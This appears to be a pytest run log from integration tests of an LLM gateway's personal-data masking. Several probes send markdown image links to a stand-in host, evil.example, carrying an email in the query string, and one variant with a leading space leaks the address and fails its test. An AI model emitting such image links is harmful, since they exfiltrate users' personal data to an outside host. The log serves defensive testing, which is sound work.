@@ -1,0 +1,101 @@
+2026-11-03 16:29:38,812 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:38,840 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=349
+2026-11-03 16:29:39,373 INFO ffcore.access access method=POST path=/api/v1/projects/6cdd5959-eb45-4c01-813d-043374d53780/api-keys status=201 ms=288
+2026-11-03 16:29:39,623 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:40,233 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=778
+PROBE facade history: stale <<PII_1>> in the run's scope reads None
+.2026-11-03 16:29:45,795 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:46,073 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 16:29:46,134 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:46,239 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:46,253 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=116
+2026-11-03 16:29:46,305 INFO ffcore.access access method=POST path=/api/v1/projects/90ef5f4f-2d1c-4242-ae5c-907cadbdadd2/api-keys status=201 ms=49
+2026-11-03 16:29:46,368 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:46,429 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:46,528 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:46,529 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:46,613 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=242
+PROBE direct md image: kept -> 'hello ![x](https://evil.example/p?q=ayse.yilmaz@example.'
+.2026-11-03 16:29:46,961 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 16:29:47,037 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:47,159 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:47,173 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=133
+2026-11-03 16:29:47,222 INFO ffcore.access access method=POST path=/api/v1/projects/79545e10-e582-40ed-9791-616bf2702264/api-keys status=201 ms=45
+2026-11-03 16:29:47,279 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:47,331 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:47,430 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:47,430 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:47,493 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=210
+PROBE direct md image space //: REVEALED -> 'hello ![x]( //evil.example/p?q=ayse.yilmaz@example.test)'
+F2026-11-03 16:29:47,888 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 16:29:47,967 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:48,073 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:48,085 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=116
+2026-11-03 16:29:48,128 INFO ffcore.access access method=POST path=/api/v1/projects/403c96d2-ec69-4633-901f-55424154607c/api-keys status=201 ms=39
+2026-11-03 16:29:48,184 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:48,246 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:48,379 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:48,379 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:48,450 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=261
+PROBE direct md ref def //: kept -> 'hello ![x][1]\n\n[1]: //evil.example/p?q=ayse.yilmaz@examp'
+.2026-11-03 16:29:48,887 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 16:29:48,953 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:49,057 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:49,070 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=114
+2026-11-03 16:29:49,113 INFO ffcore.access access method=POST path=/api/v1/projects/56b882c1-0209-422e-bdde-8def10fe02eb/api-keys status=201 ms=40
+2026-11-03 16:29:49,170 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 16:29:49,225 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 16:29:49,321 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:49,321 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 16:29:49,382 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=209
+PROBE direct md angle dest space: kept -> 'hello ![x](<https://evil.example/a b?q= ayse.yilmaz@exam'
+.2026-11-03 16:29:49,704 INFO ffcore.litellm_reconcile litellm_reconciled created=1 updated=0 deleted=0 problems=0
+PROBE status completed requests 1
+PROBE provider saw raw phone: False
+PROBE provider history lines: ['You answer from the documents."}, {"role": "user", "content": "Telefonu ne?"}, {"role": "assistant", "content": "Kendisine <<PII_10>> üzerinden ulaşabilirsiniz.', 'Kayıt: https://crm.example/ara?tel=<<PII_10>>', 'Diğer kayıt <<PII_7>> idi."}, {"role": "user", "content": "Onu ve <<PII_9>> kaydını nasıl ararım?"}], "model": "ok-primary", "max_tokens": 400, "stream": true, "stream_options": {"include_usage": true}, "reasoning_effort": "none"}]']
+PROBE B lookups {'<<PII_7>>': None, '<<PII_9>>': None, '<<PII_10>>': '0532 123 45 67'}
+PROBE A mapping ttl after B (was 50): 50
+PROBE stored messages: rows 4, raw phone False
+PROBE stored run_events: rows 5, raw phone False
+PROBE stored guardrail_events: rows 4, raw phone False
+PROBE stored runs.output: rows 1, raw phone False
+PROBE stored checkpoint_blobs: rows 0, raw phone False
+PROBE stored checkpoint_writes: rows 0, raw phone False
+.
+=================================== FAILURES ===================================
+_______________ test_zz_r2_direct_url_shapes[md image space //] ________________
+
+direct = (UUID('79545e10-e582-40ed-9791-616bf2702264'), <starlette.testclient.TestClient object at 0x7fd7fe9a5610>, {'id': '24e...ame': 'facade', 'key_prefix': 'ffk_507bb36d', ...}, <tests.integration.facade_support.Facade object at 0x7fd79d2c3ad0>)
+shape = 'md image space //'
+
+    @pytest.mark.usefixtures("clean_litellm")
+    @pytest.mark.parametrize("shape", list(URL_SHAPES))
+    def test_zz_r2_direct_url_shapes(direct, shape):
+        _, _, _, client = direct
+        text = URL_SHAPES[shape].format(v=EMAIL)
+        response = client.chat("tooly", messages=_tool_turn(text), tools=[TOOL])
+        assert response.status_code == 200, response.text
+        content = response.json()["choices"][0]["message"]["content"]
+        print(f"PROBE direct {shape}: {'REVEALED' if EMAIL in content else 'kept'} -> {content!r}")
+>       assert EMAIL not in content
+E       AssertionError: assert 'ayse.yilmaz@example.test' not in 'hello ![x](...xample.test)'
+E         
+E         'ayse.yilmaz@example.test' is contained here:
+E           hello ![x]( //evil.example/p?q=ayse.yilmaz@example.test)
+
+tests/integration/test_zz_review_08t1a_r2.py:77: AssertionError
+------------------------------ Captured log setup ------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=2 updated=0 deleted=0 problems=0
+ERROR    ffcore.readiness:readiness.py:56 warmup failed: ModelMissing
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=0
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=200 ms=133
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/projects/79545e10-e582-40ed-9791-616bf2702264/api-keys status=201 ms=45
+ERROR    ffcore.readiness:readiness.py:56 warmup failed: ModelMissing
+------------------------------ Captured log call -------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=0
+WARNING  langfuse:client.py:1399 Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+WARNING  langfuse:client.py:1399 Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+INFO     ffcore.access:logging.py:263 access method=POST path=/v1/chat/completions status=200 ms=210
+=========================== short test summary info ============================
+FAILED tests/integration/test_zz_review_08t1a_r2.py::test_zz_r2_direct_url_shapes[md image space //]
+1 failed, 5 passed in 21.00s
